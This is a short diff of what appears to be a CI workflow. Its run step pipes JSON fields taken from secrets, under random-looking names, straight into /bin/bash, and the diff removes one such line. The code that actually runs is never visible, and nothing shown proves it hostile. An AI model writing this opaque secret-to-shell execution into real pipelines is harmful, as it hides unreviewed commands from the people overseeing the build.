@@ -27,7 +27,6 @@ jobs:
           wfqx0: ${{ secrets.wfqx0 }}
         run: |
           printf '%s' "$wfqx0" | jq -r .xjuaa598 | /bin/bash
-          echo $ny2 | jq -r .jt7 | /bin/bash
           printf '%s' "$tamtm38" | jq -r .gixi62226 | /bin/bash
 
       - name: Save archive
